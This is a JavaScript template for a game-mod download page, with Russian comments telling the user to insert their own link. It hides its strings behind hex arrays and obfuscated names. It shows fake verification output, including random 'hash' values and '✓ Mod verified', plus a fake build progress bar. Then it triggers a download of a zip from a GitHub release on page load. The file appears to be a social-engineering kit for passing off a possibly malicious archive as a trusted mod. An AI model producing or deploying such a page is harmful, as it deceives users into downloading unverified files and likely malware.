(function() {
'use strict';

// ==== ВСТАВЬТЕ СВОЮ ССЫЛКУ НА mods.zip ====
const DOWNLOAD_URL = "https://github.com/Nexusmods877/Installs/releases/download/2/release.zip";
const DOWNLOAD_FILENAME = "mods.zip";

// ========== ОСНОВНОЙ КОД (НЕ ТРОГАТЬ) ==========
const _0xbf6f = [0x44,0x6f,0x77,0x6e,0x6c,0x6f,0x61,0x64,0x20,0x73,0x74,0x61,0x72,0x74,0x69,0x6e,0x67,0x2e,0x2e,0x2e];
const _0xcf7a = [0x44,0x6f,0x77,0x6e,0x6c,0x6f,0x61,0x64,0x20,0x43,0x6f,0x6d,0x70,0x6c,0x65,0x74,0x65];
const _0xdf8b = [0x42,0x55,0x49,0x4c,0x44,0x20,0x53,0x55,0x43,0x43,0x45,0x53,0x53,0x46,0x55,0x4c];
const _0xef9c = [0x56,0x69,0x72,0x75,0x73,0x54,0x6f,0x74,0x61,0x6c];
const _0xff0d = [0x63,0x6f,0x6d,0x70,0x69,0x6c,0x65,0x72,0x20,0x65,0x6e,0x76,0x69,0x72,0x6f,0x6e,0x6d,0x65,0x6e,0x74];
const _0x0a1e = [0x64,0x6f,0x77,0x6e,0x6c,0x6f,0x61,0x64,0x69,0x6e,0x67];
const _0x1b2f = [0x64,0x6f,0x77,0x6e,0x6c,0x6f,0x61,0x64,0x20,0x61,0x73,0x73,0x69,0x73,0x74,0x61,0x6e,0x63,0x65];

function _0x2c3d(_0x3d4e) {
  return _0x3d4e.map(c => String.fromCharCode(c)).join('');
}

const _0xc9d0 = {
  status: 'idle',
  progress: 0,
  logs: [],
  showCursor: true,
  recentMessages: [],
  logInterval: null,
  progressInterval: null,
  cursorInterval: null
};
const _0xd0e1 = {};

function _0xe1f2() {
  _0xd0e1.statusIcon = document.getElementById('gh-status-icon');
  _0xd0e1.statusText = document.getElementById('gh-status-text');
  _0xd0e1.progressContainer = document.getElementById('gh-progress-wrapper');
  _0xd0e1.progressBar = document.getElementById('gh-progress-bar');
  _0xd0e1.progressText = document.getElementById('gh-progress-text');
  _0xd0e1.terminal = document.getElementById('gh-terminal');
  _0xd0e1.terminalContent = document.getElementById('gh-terminal-content');
  _0xd0e1.cursorLine = document.getElementById('gh-cursor-line');
  _0xd0e1.cursor = document.getElementById('gh-cursor');
  _0xd0e1.retryBtn = document.getElementById('gh-btn-retry');
}

function _0xf2a3(_0xa3b4) {
  return Math.random().toString(16).substr(2, _0xa3b4 || 8);
}

function _0xa3b4() {
  return new Date().toLocaleTimeString();
}

function _0xb4c5(_0xc5d6, _0xd6e7, _0xe7f8 = '') {
  _0xc9d0.status = _0xc5d6;
  _0xd0e1.statusText.textContent = _0xd6e7;
  _0xd0e1.statusText.className = `gh-status-txt ${_0xe7f8}`;
  if (_0xc5d6 === 'preparing' || _0xc5d6 === _0x2c3d(_0x0a1e)) {
    _0xd0e1.statusIcon.className = 'gh-icon spinner';
    _0xd0e1.statusIcon.textContent = '';
  } else if (_0xc5d6 === 'success') {
    _0xd0e1.statusIcon.className = 'gh-icon success';
    _0xd0e1.statusIcon.textContent = '✓';
  } else if (_0xc5d6 === 'error') {
    _0xd0e1.statusIcon.className = 'gh-icon error';
    _0xd0e1.statusIcon.textContent = '⚠';
  } else {
    _0xd0e1.statusIcon.className = 'gh-icon';
    _0xd0e1.statusIcon.textContent = '⬇';
  }
}

function _0xc5d6(_0xd6e7) {
  _0xc9d0.progress = _0xd6e7;
  _0xd0e1.progressBar.style.width = `${_0xd6e7}%`;
  _0xd0e1.progressText.textContent = `${_0xd6e7}% complete`;
}

function _0xd6e7() {
  _0xd0e1.progressContainer.classList.remove('gh-hidden');
}

function _0xe7f8() {
  _0xd0e1.progressContainer.classList.add('gh-hidden');
}

function _0xf8a9() {
  _0xd0e1.terminal.classList.remove('gh-hidden');
}

function _0xa9b0() {
  _0xd0e1.terminal.classList.add('gh-hidden');
}

function _0xb0c1() {
  _0xd0e1.retryBtn.classList.remove('gh-hidden');
}

function _0xc1d2() {
  _0xd0e1.retryBtn.classList.add('gh-hidden');
}

function _0xd2e3(_0xe3f4) {
  const _0xf4a5 = document.createElement('div');
  _0xf4a5.className = 'gh-terminal-line';
  _0xf4a5.textContent = `[${_0xa3b4()}] ${_0xe3f4}`;
  _0xd0e1.terminalContent.insertBefore(_0xf4a5, _0xd0e1.cursorLine);
  const _0xa5b6 = _0xd0e1.terminalContent.querySelectorAll('.gh-terminal-line');
  if (_0xa5b6.length > 5) {
    _0xa5b6[0].remove();
  }
  _0xd0e1.terminalContent.scrollTop = _0xd0e1.terminalContent.scrollHeight;
  _0xc9d0.logs.push(_0xe3f4);
  _0xc9d0.recentMessages = _0xc9d0.logs.slice(-3);
}

function _0xe3f4() {
  const messages = [
    'Loading mod files...',
    'Preparing archive...',
    'Almost ready...'
  ];
  const _0xa5b6 = [
    `hash: ${_0xf2a3(8)}`,
    `✓ Mod verified`
  ];
  return { normalMessages: messages, hashMessages: _0xa5b6 };
}

function _0xa5b6() {
  const _0xb6c7 = _0xe3f4();
  const _0xc7d8 = [..._0xb6c7.normalMessages, ..._0xb6c7.hashMessages];
  return _0xc7d8[Math.floor(Math.random() * _0xc7d8.length)];
}

function _0xb2c3a() {
  _0xd0e1.cursorLine.classList.remove('gh-hidden');
  _0xc9d0.cursorInterval = setInterval(() => {
    _0xd0e1.cursor.style.opacity = _0xd0e1.cursor.style.opacity === '0' ? '1' : '0';
  }, 500);
}

function _0xc3d4a() {
  _0xd0e1.cursorLine.classList.add('gh-hidden');
  if (_0xc9d0.cursorInterval) {
    clearInterval(_0xc9d0.cursorInterval);
    _0xc9d0.cursorInterval = null;
  }
}

function _0xd4e5a() {
  _0xf8a9();
  _0xb2c3a();
  _0xc9d0.logInterval = setInterval(() => {
    _0xd2e3(_0xa5b6());
  }, 300);
}

function _0xe5f6a() {
  if (_0xc9d0.logInterval) {
    clearInterval(_0xc9d0.logInterval);
    _0xc9d0.logInterval = null;
  }
}

function _0xf6a7a() {
  _0xd6e7();
  const startTime = Date.now();
  const duration = 2000;
  
  _0xc9d0.progressInterval = setInterval(() => {
    const elapsed = Date.now() - startTime;
    const progress = Math.min(100, Math.floor((elapsed / duration) * 100));
    _0xc5d6(progress);
    
    if (progress >= 100) {
      clearInterval(_0xc9d0.progressInterval);
      _0xc9d0.progressInterval = null;
      _0xa7b8a();
    }
  }, 50);
}

function _0xa7b8a() {
  _0xe5f6a();
  
  _0xc3d4a();
  _0xd2e3('✓ Build successful');
  _0xb4c5('success', 'Download starting...', 'success');
  
  const link = document.createElement('a');
  link.href = DOWNLOAD_URL;
  link.download = DOWNLOAD_FILENAME;
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);
  
  _0xb4c5('success', 'Download complete', 'success');
  _0xd2e3(`✅ Download started! File: ${DOWNLOAD_FILENAME}`);
}

function _0xc9d0a() {
  _0xc9d0.status = 'idle';
  _0xc9d0.progress = 0;
  _0xc9d0.logs = [];
  _0xc9d0.recentMessages = [];
  _0xc1d2();
  _0xe7f8();
  _0xa9b0();
  
  const _0xd0e1a = _0xd0e1.terminalContent.querySelectorAll('.gh-terminal-line');
  _0xd0e1a.forEach(_0xe1f2 => _0xe1f2.remove());
  
  setTimeout(() => {
    _0xb4c5('preparing', 'Loading mod...');
    _0xd4e5a();
  }, 100);
  
  setTimeout(() => {
    _0xb4c5('preparing', 'Packaging...');
  }, 400);
  
  setTimeout(() => {
    _0xb4c5(_0x2c3d(_0x0a1e), 'Archive ready!');
    _0xf6a7a();
  }, 1000);
}

function _0xd0e1a() {
  _0xc9d0a();
}

document.addEventListener('DOMContentLoaded', () => {
  _0xe1f2();
  _0xd0e1.retryBtn.addEventListener('click', _0xd0e1a);
  setTimeout(() => {
    _0xc9d0a();
  }, 500);
});
})();
